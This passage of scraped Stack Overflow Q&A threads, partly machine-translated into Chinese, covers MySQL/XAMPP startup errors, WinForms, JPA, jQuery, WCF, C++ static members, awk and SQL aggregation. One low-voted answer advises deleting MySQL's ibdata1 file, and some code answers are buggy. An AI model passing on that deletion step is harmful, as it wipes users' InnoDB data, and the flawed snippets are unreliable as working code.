 130301 16:31:02 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
 130301 17:00:46 [Note] Plugin 'FEDERATED' is disabled.
 InnoDB: The InnoDB memory heap is disabled
 InnoDB: Mutexes and rw_locks use Windows interlocked functions
 InnoDB: Compressed tables use zlib 1.2.3
 130301 17:00:46  InnoDB: Initializing buffer pool, size = 16.0M
 130301 17:00:46  InnoDB: Completed initialization of buffer pool
 130301 17:00:46  InnoDB: highest supported file format is Barracuda.
 130301 17:00:47  InnoDB: 1.1.4 started; log sequence number  1595675
 130301 17:00:47 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
130301 17:07:40 [Note] Plugin 'FEDERATED' is disabled.
 InnoDB: The InnoDB memory heap is disabled
 InnoDB: Mutexes and rw_locks use Windows interlocked functions
 InnoDB: Compressed tables use zlib 1.2.3
 130301 17:07:40  InnoDB: Initializing buffer pool, size = 16.0M
 130301 17:07:40  InnoDB: Completed initialization of buffer pool
 130301 17:07:40  InnoDB: highest supported file format is Barracuda.
 130301 17:07:40  InnoDB: 1.1.4 started; log sequence number 1595675
 130301 17:07:40 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2)
 130301 17:07:47 [Note] Plugin 'FEDERATED' is disabled.
 InnoDB: The InnoDB memory heap is disabled
 InnoDB: Mutexes and rw_locks use Windows interlocked functions
  InnoDB: Compressed tables use zlib 1.2.3
 130301 17:07:47  InnoDB: Initializing buffer pool, size = 16.0M
 130301 17:07:47  InnoDB: Completed initialization of buffer pool
 130301 17:07:47  InnoDB: highest supported file format is Barracuda.
 130301 17:07:47  InnoDB: 1.1.4 started; log sequence number 1595675
 130301 17:07:47 [ERROR] Fatal error: Can't open and lock privilege tables: Can't find file: 'host' (errno: 2) 
```

我需要更改配置文件以匹配 Apache 文件吗？我看不到任何明显的东西。

提前谢谢了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-03T16:33:24.977

最终通过卸载 XAMPP，重新安装它然后将 Apache 使用的端口从 80 更改为 8080 来解决问题。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2014-05-05T08:48:02.723

嘿，我刚做了这个，它奏效了：

1.  退出 Xampp 服务器
2.  转到您的`C:\xampp\mysql\data`目录
3.  删除`ibdata1`文件
4.  重新启动 xampp 服务器

# winforms - How to make a textbox accept only digits and formats numbers with commas?

> ID：15163564
> 
> 赞同：6
> 
> 时间：2013-03-01T17:34:34.760
> 
> 标签：winforms, c#-2.0

I need a text box that:

(1) only accepts digits as characters.

(2) automatically continues to format numeric values with commas as the user types into it.

For example,

```
 1 becomes        1.00
    10 becomes       10.00
   100 becomes      100.00
  1000 becomes    1,000.00
 10000 becomes   10,000.00
100000 becomes 1,00,000.00 
```

How to achieve that?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-04T17:50:58.707

*在*用户输入时格式化数字通常效果很差。您应该为此使用 MaskedTextBox。互联网上的大量代码显示了如何过滤 KeyPress 以便只能输入数字。使用粘贴命令可以轻松击败其中的大部分内容。

理智的方法是对待能够输入数字等基本技能的用户，并温和地提醒她她弄错了。Validating 事件就是为此而设计的。这也是格式化数字的最佳时机。在您的项目中添加一个新类并粘贴以下代码：

```
using System;
using System.ComponentModel;
using System.Windows.Forms;

public class NumberBox : TextBox {
    public NumberBox() {
        Fraction = 2;
    }

    public ErrorProvider ErrorProvider { get; set; }

    [DefaultValue(2)]
    public int Fraction { get; set; }

    public event EventHandler ValueChanged;
    public decimal Value {
        get { return this.value; }
        set {
            if (value != this.value) {
                this.value = value;
                this.Text = Value.ToString(string.Format("N{0}", Fraction));
                var handler = ValueChanged;
                if (handler != null) ValueChanged(this, EventArgs.Empty);
            }
        }
    }

    protected override void OnValidating(CancelEventArgs e) {
        if (this.Text.Length > 0 && !e.Cancel) {
            decimal entry;
            if (decimal.TryParse(this.Text, out entry)) {
                if (ErrorProvider != null) ErrorProvider.SetError(this, "");
                Value = entry;
            }
            else {
                if (ErrorProvider != null) ErrorProvider.SetError(this, "Please enter a valid number");
                this.SelectAll();
                e.Cancel = true;
            }
        }
        base.OnValidating(e);
    }

    protected override void OnEnter(EventArgs e) {
        this.SelectAll();
        base.OnEnter(e);
    }

    private decimal value;
} 
```

编译。将新的 NumberBox 控件从工具箱顶部拖放到窗体上。还要在表单上放置一个 ErrorProvider，以便可以以适度的方式报告输入错误，设置新控件的 ErrorProvider 属性。可以选择修改 Fraction 属性。您可以订阅 ValueChanged 事件以了解值何时被修改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-11T16:33:43.777

我不知道这是否会有所帮助，但它是这样的：

```
try
{
    double number = Convert.toDouble(textBox.Text);
    string[] digits = Regex.Split(textBox.Text, @"\W+");
    int x = 0;
    List<string> finalNumber = new List<string>();
    while(x < numbers.Length)
    {
        if(digits[x] == ".")
            break;
        if(x%3 = 0 && x != 0)
        {
            finalNumber.Add(",");   
        }
        finalNumber.Add(digits[x]);
        x++;
    }
    string finalNumberJoined = "";
    foreach(var digit in finalNumber)
    {
        finalNumberJoined = finalNumberJoined + digit;
    }
}
catch
{
    //not a number
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-04T17:26:34.347

您是否尝试过查看蒙面文本框？

[http://msdn.microsoft.com/en-us/library/system.windows.forms.maskedtextbox(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/system.windows.forms.maskedtextbox(v=vs.80).aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T03:33:38.513

有一个非常简单的方法：使用 TextChanged 和 Leave 事件。

```
private void textBox_TextChanged(object sender, EventArgs e)
{
   decimal theNumber;
   if(!decimal.TryParse((sender as TextBox).Text, out theNumber))
   {
      (sender as TextBox).Text = string.empty;
   }
} 
```

不要尝试格式化 TextChanged 事件中的数字，它会变得混乱。然后当用户离开文本框时更改格式。

```
private void textBox_Leave(object sender, EventArgs e)
{
   // Since you were validating the number while typing now there is no need for TryParse
   decimal theNumber = decimal.Parse((sender as TextBox).Text);
   (sender as TextBox).Text = string.Format("{0:N2}", theNumber);
} 
```

注意：这很简单，如果您需要更详细的内容（最佳实践和所有这些东西......），请参阅 Hans 的回答。

# jakarta-ee - JPA NamedQuery Sub Query

> ID：15163565
> 
> 赞同：2
> 
> 时间：2013-03-01T17:34:38.977
> 
> 标签：jakarta-ee, jpa, named-query

I am knocking my head off on a Named Query. I use JPA.. What I would like to achieve is to select all articles with active flags, for a specifc last state (passed as a parameter).

Here are my classes:

*   Article (intId)
*   ArticleState (An article may have one or many states, only only is active though)
*   State (State of an article)

    1.  Saved
    2.  Draft
    3.  Reworked
    4.  Approved
    5.  Archived
    6.  Retired

Here is my query:

```
@NamedQuery(
    name =  "Article.listArticlesWithActiveFlags",
    query = "SELECT DISTINCT article " +
            "FROM Article article " +
            "INNER JOIN article.articleFlags articleFlag " +
            "INNER JOIN article.articleStates articleState " +
            "WHERE articleFlag.active = true " +
            "AND articleState.state.intId = :intStateId " + 
            "AND articleState.intId = ( " + 
            "      SELECT MAX(articleState2.intId) " +  
            "      FROM Article article2 " + 
            "      INNER JOIN article2.articleStates articleState2 " +  
            "      WHERE articleState2.state.intId = :intStateId " +
            "      AND articleState2.article.intId = article.intId " +
            "      GROUP BY article2.intId) "
), 
```

The query runs fine without any error. My problem: Let's say I have an article with the following lifecycle:

2012-02-24: created, so it is in "Saved" state 2012-02-25: submitted for approval, so it is now in "Draft" state 2012-02-26: a moderator modifies the articles to meet specific standards, so it is now in "Reworked" state 2012-03-01: the article is now approved for the entire community, so it is now "Approved" 2014-03-01: the article is now archived because it is no longer useful.

So, the article went through all possible states. My requirement is to display two seperate lists: 1\. Approved articles with active flags (in case they requires some changes) 2\. Archived articles with active flags (in case they are flagged as "still useful")

My problem is that my article shows up in both lists (approved and archived), even if the last state is in fact "Archived".

The named query is called like so: List articlesWithActiveFlags = new ArrayList();

```
 Query q = em.createNamedQuery("Article.listArticlesWithActiveFlags");
    q.setParameter("intStateId", intStateId);

    articlesWithActiveFlags = q.setMaxResults(intRowLimit).getResultList();

    return articlesWithActiveFlags; 
```

The query is called two times, one for each list. I have verified the parameter using the Eclipse debug mode, and they pass different parameters (4 for approved, and 5 for archived), which is correct.

Any idea?

Thank you

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-06-17T16:23:23.667

使用 @NamedNativeQuery 代替 @NamedQuery [在这里](http://www.java2s.com/Code/Java/JPA/UsingNamedNativeQuery.htm "这里")你有一个例子

# c# - ToolStripLabel does not redraw instantanously

> ID：15163566
> 
> 赞同：0
> 
> 时间：2013-03-01T17:34:41.463
> 
> 标签：c#, .net, windows-forms-designer

I have an application which opens an image and displays it in the window. To be exact I store this image in inner field of the form class and draw it in the method attached to `Paint` event of a `Panel` placed on that form. It's like this:

```
private void pnlImage_Paint(object sender, PaintEventArgs e)
{
    var g = e.Graphics;
    if (image != null)
    {
        g.DrawImage(image, imageLocation);
    }
} 
```

The variable `image` is a field of the form class (of type `Image`) containing the image after opening; `imageLocation` is connected to scrolling and scrollbars, which is irrelevant to this case.

On that form I also placed a `ToolStrip` on the bottom of it, and on this `ToolStrip` there are some `ToolStripLabels`, which are supposed to be some indicators about the image. E.g. there is a `ToolStripLabel`, which I want to show current position of mouse cursor over my image, or - from the other point of view - pixel position (on the image) under the mouse cursor. So I update value of my label(s) in the method attached to the `MouseMove` event, like this:

```
private void pnlImage_MouseMove(object sender, MouseEventArgs e)
{
    UpdateCursorAtLabel(e.X, e.Y); // <---- method of interest
    UpdateColorLabel(e.X, e.Y); // other label, showing color of the pixel. It's an identical thing, so I did not mention it
} 
```

And the contents of method `UpdateCursorAtLabel(int, int)`, directly responsible for updating the "cursor at" label is:

```
void UpdateCursorAtLabel(int cursorX, int cursorY)
{
    lblCursorAtValue.Text = image != null ? 
        String.Format("{0}, {1}", scbHorizontal.Value + cursorX, scbVertical.Value + cursorY) :
        nullText;
    lblCursorAtValue.Invalidate();
} 
```

`lblCursorAtValue` - this is the label which should show position of pixel under mouse, e.g. "234, 117". `scbHorizontal`, `scbVertical` - just some scrollbars, irrelevant, I just need them to calculate position. `nullText` - `const string`, equals "---".

And at the beginning there was no using of `Invalidate()` method. When I made this all, I noticed, that as I move cursor over my panel, contents of the label does not change at all! Only when I **stop** moving cursor, I can see the new value of label. So I added `lblCursorAtValue.Invalidate()` to enforce redrawing of label. Still the same problem. I even checked one more thing - attached a method to the `Paint` event of this label, not filling it, and put there a breakpoint. In runtime debugger stopped there only after I stopped moving cursor, or got it out of bounds of the Panel. There are no such methods on the `ToolStripLabel` as `Update()` or `Refresh()`, so I can't use anything stronger than `Invalidate()`. I really don't get why this is happening, and how could I fix it.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T23:02:40.440

解决了。我忘记了一件关键的事情。而且该`UpdateColorLabel(int, int)`方法并不像一开始看起来那样无关紧要。因为它就像：

```
void UpdateColorLabel(int cursorX, int cursorY)
{
    if (image == null)
    {
        lblColorValue.Text = nullText;
    }
    else
    {
        var imageCursorLocation = new Point(scbHorizontal.Value + cursorX, scbVertical.Value + cursorY);
        var px = new Bitmap(image).GetPixel(imageCursorLocation.X, imageCursorLocation.Y);
        lblColorValue.Text = String.Format("R = {0}, G = {1}, B = {2}", px.R, px.G, px.B);
    }            
} 
```

里面有一行，把一切都搞砸了：

```
var px = new Bitmap(image).GetPixel(imageCursorLocation.X, imageCursorLocation.Y); 
```

是的，在这一行中，我正在创建**全新的位图**，每次**鼠标移动一个像素后！！！！**创建位图是相当耗时的操作。所以应用程序没有时间更新我的标签的外观，因为它正忙于创建数百个位图......

我通过存储位图而不是图像来修复它，所以我不必为了获得像素颜色而创建它。

# javascript - fs createReadStream 的事件并不总是被调用

> ID：15163567
> 
> 赞同：0
> 
> 时间：2013-03-01T17:34:45.160
> 
> 标签：javascript, node.js, stream, coffeescript, fs

我有一个 fs 文件流用于提供动态创建的文件下载。在设置适当的标头后，我得到了这个流并将其通过管道传输到我的响应对象。

我还设置了几个流事件，以便如果出现错误或流结束，它会从文件系统中删除生成的文件。

我遇到了一个问题，有时，当下载未正确初始化或完成时，文件系统上可能会留下一些挂起的文件。我相信这是因为我挂钩到流中的事件。

我的代码：

```
stream = fs.createReadStream( fileName, {bufferSize: 64*1024})

had_error = false;
stream.on 'error', (err) ->
  had_error = err
stream.on 'close', ->
  if had_error
    console.log(had_error)

  fs.unlink fileName, (error) ->
    if error
      console.log("DELETE ERROR")
      console.log error

  fs.unlink dataFileName, (error) ->
    if error
      console.log("DELETE ERROR")
      console.log error 
```

检查[流 API](http://nodejs.org/api/stream.html#stream_readable_stream)文档，并非所有流都调用“关闭”事件。我会使用“结束”事件，但是根据文档：`Indicates that no more 'data' events will happen. If the stream is also writable, it may be possible to continue writing.`

我担心如果我要使用“结束”事件，您是否会遇到这样的问题：如果我删除这些文件并且流未完成对 http 响应的写入，这将导致下载损坏。

任何“确定”事件可以用作删除这些文件而不中断下载的捕获？

最坏的情况是我写了一个 cronjob 来删除这些文件（bleh）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:50:07.120

我从来没有想出确保事件被调用的可靠方法。我猜如果`response`对象从未真正启动流，它就永远不会启动，因此永远不会有结束事件。如果有人知道解决方法，请随时回答并获得免费接受的答案。

# javascript - 如何使用 Jquery 将所有输入值更改为大写？

> ID：15163570
> 
> 赞同：21
> 
> 时间：2013-03-01T17:34:52.890
> 
> 标签：javascript, jquery, html

我想在提交表单之前将所有表单值更改为大写。

到目前为止，我有这个，但它不工作。

```
$('#id-submit').click(function () {
        var allInputs = $(":input");
        $(allInputs).value.toUpperCase();
        alert(allInputs);
}); 
```

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2013-03-01T17:36:59.787

尝试如下，

```
$('input[type=text]').val (function () {
    return this.value.toUpperCase();
}) 
```

您应该使用`input[type=text]`代替，`:input`或者`input`因为我相信您的意图是仅在文本框上进行操作。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-03-01T17:36:42.857

使用 css：

```
input.upper { text-transform: uppercase; } 
```

可能最好使用样式，并转换服务器端。还有一个 jQuery 插件强制大写： http: [//plugins.jquery.com/plugin-tags/uppercase](http://plugins.jquery.com/plugin-tags/uppercase)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-03-01T17:37:03.843

```
$('#id-submit').click(function () {
    $("input").val(function(i,val) {
        return val.toUpperCase();
    });
}); 
```

[**小提琴**](http://jsfiddle.net/adeneo/uJL7k/1/)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-07-27T09:12:21.680

使用 css text-transform 在所有输入类型文本中显示文本。在 Jquery 中，您可以在模糊事件中将值转换为大写。

CSS：

```
input[type=text] {
    text-transform: uppercase;
} 
```

查询：

```
$(document).on('blur', "input[type=text]", function () {
    $(this).val(function (_, val) {
        return val.toUpperCase();
    });
}); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-03-01T17:36:53.783

您可以使用[每个（）](http://api.jquery.com/jQuery.each/)

```
$('#id-submit').click(function () {
      $(":input").each(function(){
          this.value = this.value.toUpperCase();          
      });
}); 
```

# c# - Hosting WCF Services in Asp.Net MVC Project

> ID：15163572
> 
> 赞同：11
> 
> 时间：2013-03-01T17:35:06.167
> 
> 标签：c#, asp.net, asp.net-mvc, wcf

I have a solution with 3 projects:

1.  ConsoleClient (for testing WCF service)
2.  ServiceLibrary (for WCF)
3.  Web (asp.net mvc project)

I have done some settings in my ServiceLibrary project in app.config

```
 <system.serviceModel>
    <services>
      <service name="MrDAStoreJobs.ServiceLibrary.AdvertisementService">
        <clear />
        <endpoint address="http://localhost:8050/ServiceLibrary/basic" binding="basicHttpBinding" bindingConfiguration="" contract="MrDAStoreJobs.ServiceLibrary.Interface.IAdvertisementService" />
        <host>
          <baseAddresses>
            <add baseAddress="http://localhost:8050/Design_Time_Addresses/MrDAStoreJobs/ServiceLibrary/AdvertisementService/" />
          </baseAddresses>
        </host>
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <!-- To avoid disclosing metadata information, 
          set the value below to false before deployment -->
          <serviceMetadata httpGetEnabled="True" />
          <!-- To receive exception details in faults for debugging purposes, 
          set the value below to true.  Set to false before deployment 
          to avoid disclosing exception information -->
          <serviceDebug includeExceptionDetailInFaults="False" />
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel> 
```

When I run this project, everythings seems normally using wcf test client.

Now, i have also added a `WcfDataServiceTest.svc` in my `Web project(mvc)` to host my wcf service.

**So, my questions are:**

1.  what configuration do I need for my web project (web.config) to actually host this wcf service?
2.  And then I want to run the console app to test it?

**Note:** i have tested my service using console project but that was getting proxy generation from WCF test client.

By the way, the wcfDataServiceTest.svc file looks like this:

```
public class WcfDataServiceTest : DataService<AdvertisementService>
{
    // This method is called only once to initialize service-wide policies.
    public static void InitializeService(DataServiceConfiguration config)
    {
        // TODO: set rules to indicate which entity sets and service operations are visible, updatable, etc.
        // Examples:
        config.SetEntitySetAccessRule("Advertisements", EntitySetRights.AllRead);
        // config.SetServiceOperationAccessRule("MyServiceOperation", ServiceOperationRights.All);
        config.DataServiceBehavior.MaxProtocolVersion = DataServiceProtocolVersion.V3;
    }
} 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-01T19:09:01.670

我直接在我的 MVC 项目中托管 WCF 服务。以下是其结构的通用示例：

Web.config 服务配置：

```
<system.serviceModel>
<behaviors>
  <serviceBehaviors>
    <behavior name="">
      <serviceMetadata httpGetEnabled="true" />
      <serviceDebug includeExceptionDetailInFaults="false" />
    </behavior>
  </serviceBehaviors>
</behaviors>
<bindings>
  <customBinding>
    <binding name="customBinding0">
      <binaryMessageEncoding />
      <httpTransport />
    </binding>
  </customBinding>
</bindings>
<serviceHostingEnvironment aspNetCompatibilityEnabled="true" multipleSiteBindingsEnabled="true" />
<standardEndpoints>
  <webHttpEndpoint>
    <standardEndpoint name="" helpEnabled="true" defaultOutgoingResponseFormat="Json" automaticFormatSelectionEnabled="true" maxReceivedMessageSize="1048576">
      <readerQuotas maxStringContentLength="1048576" />
    </standardEndpoint>
  </webHttpEndpoint>
</standardEndpoints>
</system.serviceModel> 
```

这是服务类：

```
[ServiceContract]
[ServiceBehavior(InstanceContextMode = InstanceContextMode.PerCall)]
[AspNetCompatibilityRequirements(RequirementsMode = AspNetCompatibilityRequirementsMode.Allowed)]
public class MyService
{
    [OperationContract]
    [WebInvoke(UriTemplate = "{personId}", Method = "GET")]
    public Person Get(string personId)
    {
        return new Person();
    }
} 
```

这是我在 MVC Global.asax 中注册它的地方

```
public static void RegisterRoutes(RouteCollection routes)
{
    routes.IgnoreRoute("{resource}.axd/{*pathInfo}");
    RouteTable.Routes.Add(new ServiceRoute("SVC/My", new WebServiceHostFactory(), typeof(MyService)));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-10T16:48:51.170

[这](http://druss.co/2013/10/host-wcf-service-library-in-asp-net-mvc-4-application/)是一篇博客文章，其中描述了如何将 WCF 服务添加到 ASP.NET MVC 4 应用程序中。

您应该添加：

```
<endpointBehaviors>
    <behavior name="restBehavior">
      <webHttp />
    </behavior>
  </endpointBehaviors> 
```

# c++ - 静态类数据成员的范围

> ID：15163574
> 
> 赞同：1
> 
> 时间：2013-03-01T17:35:10.410
> 
> 标签：c++, class, static, global-variables

如果我有一堂课：

**对象.h**

```
class Object
{
public:
    static int number;
}; 
```

**对象.cpp**

```
int Object::number = 5; 
```

的范围是否`Object::number`保证比创建的任何实例的范围更持久`Object`？即使它在另一个源文件中全局声明？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T17:38:04.443

是的，它具有“静态存储持续时间”，这意味着它“一直”存在[如果它有一个非标准构造函数，则在“main”开始之前调用构造函数——这对于大多数意图和目的来说应该足够了]

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-01T17:44:52.660

有点，但只是因为`int`是一个特例。例如，假设您输入`Object.cpp`：

```
Object o = {};
int Object::number = 5; 
```

然后对象`o`具有静态存储持续时间，就像这样`Object::number`做一样。它名义上是之前创建的，之后`number`会被销毁，但是由于它们都是 POD，因此这种销毁实际上没有任何效果。

但是，如果`number`并且`o`有非平凡的析构函数， then`number`将在`o`. `number`就破坏顺序而言，它是类的静态成员这一事实`o`并没有给它任何特殊处理。

如果`o`在另一个源文件中处于关闭状态，则未指定构造顺序，并且破坏顺序是构造的相反顺序（同样，如果它们具有非平凡的析构函数——`int`这是一种特殊情况，因为它没有）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-01T17:53:33.943

是的，有两个原因：

*   它具有静态存储持续时间，因此它的存储持续到程序的生命周期
*   它有一个没有构造函数的类型，用一个常量表达式初始化。

总之，这意味着它在*静态初始化*阶段被初始化，在任何用户定义的代码（包括静态对象的构造函数）运行之前。因此，在任何代码可以访问它之前，它保证存在并被初始化。

如果它具有构造函数或非常量初始化器，那么它将在*动态初始化*期间与所有其他此类对象一起初始化。在这种情况下，另一个静态对象的构造函数或初始化程序可能会在初始化之前访问该对象。该问题有时被称为“静态初始化顺序惨败”。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-01T17:52:51.260

考虑这个 g++ 程序：

```
#include <iostream>
#define X() (std::cout << __PRETTY_FUNCTION__ << "\n")

struct M {
 M() { X(); }
 ~M() { X(); }
};  

struct C {
 C() { X(); }
 ~C() { X(); }
 static M m;
};
C c;
M C::m;
int main () { X(); } 
```

在这个程序中，`c`必须在之前初始化`C::m`，并且必须在之后销毁`C::m`。如果你编译这个程序并考虑它的输出，你会看到类似的东西：

```
C::C()
M::M()
int main()
M::~M()
C::~C() 
```

所以，不，一般来说，“[成员]的[生命周期]”**不是**“保证比所创建的任何对象实例的[生命周期]更长？”

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-01T17:44:18.073

标准保证具有*静态存储持续时间*的对象在程序的整个持续时间内都存在。

C++03, **3.7.1 静态存储时长§1**：

> 所有既不具有动态存储持续时间也不是本地对象的对象具有静态存储持续时间。这些对象的存储将持续到程序的持续时间

在您的示例中，**§4**也是相关的：

> `static`应用于类定义中的类数据成员的关键字赋予数据成员静态存储持续时间。

# file - Unix命令按特定字符的出现次数排序

> ID：15163581
> 
> 赞同：0
> 
> 时间：2013-03-01T17:35:24.140
> 
> 标签：file, unix, sorting, grep

我有一个这种格式的文件：

```
key value:value:value:value
key value:value
key value
key value:value:value 
```

其中第一列有一个键，第二列有一个用 : 分隔的值列表。是否有任何命令我可以根据值列表中 : 的出现次数对这个文件进行排序，即从最多到最少，例如前面的示例将是这样的：

```
key value:value:value:value
key value:value:value
key value:value
key value 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:42:10.933

又快又脏：

```
awk -F: '{$0=NF"#"$0}1' file|sort -nr|sed 's/.*#//' 
```

用你的例子测试：

```
kent$  echo "key value:value:value:value
key value:value
key value
key value:value:value"|awk -F: '{$0=NF"#"$0}1'|sort -nr|sed 's/.*#//'
key value:value:value:value
key value:value:value
key value:value
key value 
```

**编辑**

linux/unix box 上的排序工具非常强大。但它对列/字段进行排序，而不是基于某些计算。您的要求需要先进行计算并对结果进行排序。

所以我只是添加一个新列，即 的计数`:`，然后使用 sort 命令对其进行排序，最后删除该列。

```
awk adds the column
sort does sort
sed removes that column 
```

您可以删除这些管道并查看输出，然后您将看到它是如何工作的。

# android - Tagging friends in photo android

> ID：15163587
> 
> 赞同：1
> 
> 时间：2013-03-01T17:35:52.783
> 
> 标签：android, facebook, photo, tagging

I was searching around to find answer to my question but I couldn't.

Can anyone tell me or at least guide me that How can I **Tag** friends to photo which I am gonna upload(post) to Facebook. Searching around I know that this is possible but I can't find the way how can I do it.

Can anyone guide me? I have seen in many apps this option of *tagging friends* so I know this is possible and someone knows the answer to that. Please share with me. I will be thankful to *him/her*.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:14:32.487

请参阅此处的照片 API 参考：[https ://developers.facebook.com/docs/reference/api/photo/#tags](https://developers.facebook.com/docs/reference/api/photo/#tags)

从文档中，您可以通过几种不同的方式进行操作，我在下面向您展示了几种。假设您有要标记的照片的 PHOTO_ID，第一种方法标记单个用户，并给出他们脸部位置的 (x,y)。请注意，（x，y）不是照片中的精确坐标，而是百分比。

```
Bundle params = new Bundle();
params.putString("to", "USER_ID");
params.putInt("x", 25);
params.putInt("y", 25);
Request tagRequest = new Request(session, "PHOTO_ID/tags", params, HttpMethod.POST, new Request.Callback() {
    public void onCompleted(Response response) {
        // Do something here
    }
});
tagRequest.executeAsync(); 
```

或者你可以像这样一次标记很多人（你也可以构造一个 JSON 对象，然后将 toString 传递给“tags”参数）。

```
Bundle params = new Bundle();
params.putString("tags", "[{\"tag_uid\": \"USER_ID_1\"},{\"tag_uid\": \"USER_ID_2\"}]");
Request tagRequest = new Request(session, "PHOTO_ID/tags", params, HttpMethod.POST, new Request.Callback() {
    public void onCompleted(Response response) {
        // Do something here
    }
});
tagRequest.executeAsync(); 
```

请注意，我没有测试上面的代码，因此您应该仅将其用作指南。

# orchardcms - jsPlumb .NET library/Orchard CMS Workflow

> ID：15163590
> 
> 赞同：1
> 
> 时间：2013-03-01T17:35:57.303
> 
> 标签：orchardcms, jsplumb

I'm interested in using jsPlumb to create a workflow designer. It looks like all jQuery, so I'm assuming I'd have to write the plumbing (excuse the pun) to persist changes to connections and write out the XML corresponding to a workflow definition to the design canvas.

Question #1 - is there a .NET library out there for jsPlumb? Question #2 - I watched this done in a steering committee meeting for Orchard CMS. Is the Orachd team already doing this? Should I just wait for 1.7 and look at the source code?

# mysql - MySQL - 选择所有客户和每个客户的总订单和总价值

> ID：15163591
> 
> 赞同：4
> 
> 时间：2013-03-01T17:36:02.297
> 
> 标签：mysql, sql, select, join

对于每个客户，我想返回：id、name、total_orders、total_value

顾客：

```
╔════╦═════════════╗
║ ID ║    NAME     ║
╠════╬═════════════╣
║  1 ║ John Smith  ║
║  2 ║ Jim Jimmers ║
╚════╩═════════════╝ 
```

订单：

```
╔═══════╦══════════╦═══════╗
║  ID   ║ CUSTOMER ║ VALUE ║
╠═══════╬══════════╬═══════╣
║ 34656 ║        1 ║    20 ║
║ 37345 ║        2 ║    25 ║
║ 38220 ║        1 ║    15 ║
║ 39496 ║        1 ║    38 ║
║ 41752 ║        1 ║     9 ║
║ 43734 ║        2 ║    20 ║
╚═══════╩══════════╩═══════╝ 
```

如何选择如下结果：

```
╔════╦═════════════╦═════════════╦═════════════╗
║ ID ║    NAME     ║ TOTALORDERS ║ TOTAL_VALUE ║
╠════╬═════════════╬═════════════╬═════════════╣
║  1 ║ John Smith  ║           4 ║          82 ║
║  2 ║ Jim Jimmers ║           2 ║          45 ║
╚════╩═════════════╩═════════════╩═════════════╝ 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T17:38:22.030

```
SELECT  a.ID,
        a.Name,
        COUNT(b.Customer) totalOrders,
        SUM(b.value) total_value
FROM    Customers a
        LEFT JOIN Orders b
            ON a.ID = b.Customer
GROUP   BY a.ID,
        a.Name 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/71ae4/2)

或者

```
SELECT  a.ID,
        a.Name,
        COUNT(b.Customer) totalOrders,
        COALESCE(SUM(b.value), 0) total_value
FROM    Customers a
        LEFT JOIN Orders b
            ON a.ID = b.Customer
GROUP   BY a.ID,
        a.Name 
```

要进一步了解有关联接的更多信息，请访问以下链接：

*   [SQL 连接的可视化表示](http://www.codeproject.com/Articles/33052/Visual-Representation-of-SQL-Joins)

结果，

```
╔════╦═════════════╦═════════════╦═════════════╗
║ ID ║    NAME     ║ TOTALORDERS ║ TOTAL_VALUE ║
╠════╬═════════════╬═════════════╬═════════════╣
║  1 ║ John Smith  ║           4 ║          82 ║
║  2 ║ Jim Jimmers ║           2 ║          45 ║
╚════╩═════════════╩═════════════╩═════════════╝ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:39:20.277

此查询应提供您的贬低输出：

```
SELECT c.id, c.name, count(*) AS total_orders, sum(o.value) AS total_value
FROM Customers AS c
     LEFT JOIN Orders AS o ON c.id = o.customer
GROUP BY c.id 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:46:45.177

使用内部联接，然后通过对用户 ID 进行分组来求和。

SQL join 用于通过相等点合并表，你应该看看这个[http://dev.mysql.com/doc/refman/5.0/en/join.html](http://dev.mysql.com/doc/refman/5.0/en/join.html)

抱歉，我现在没有 mysql 服务器 bu 是这样的：

select id, name, sum(value) from (select customers.id as id, customers.name as name, orders.value as value from customers inner join orders on customers.id = orders.customer) group by id

几乎可以肯定不是很正确，但在某个接近的地方。

# php - 在 PHP 中将多个变量分配给单个变量

> ID：15163596
> 
> 赞同：1
> 
> 时间：2013-03-01T17:36:30.250
> 
> 标签：php, meta-tags

我想要做的是从 variables.php 文件中保存的一个变量中调用我的所有元标记。

我可以单独回显它们，但我想为它们分配相同的名称，以便网页中的回显脚本更小。我知道这是您为整数分配相同值的方式，但我找不到使用字符串值执行此操作的解决方案（我认为它们是字符串，对吗？）

```
$john = $ jane = 3; 
```

我正在尝试什么。

```
$metaAuthor = $metaDescription = $metaImage = $metaTitle =$meta; 
```

当您不使用数字时，我假设它是一个不同的命令？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:38:19.170

不，每种值类型都相同。

[http://sandbox.onlinephpfunctions.com/code/9211ff6bebf264fa106c28a85d789b8fb6b42c99](http://sandbox.onlinephpfunctions.com/code/9211ff6bebf264fa106c28a85d789b8fb6b42c99)

```
<?php
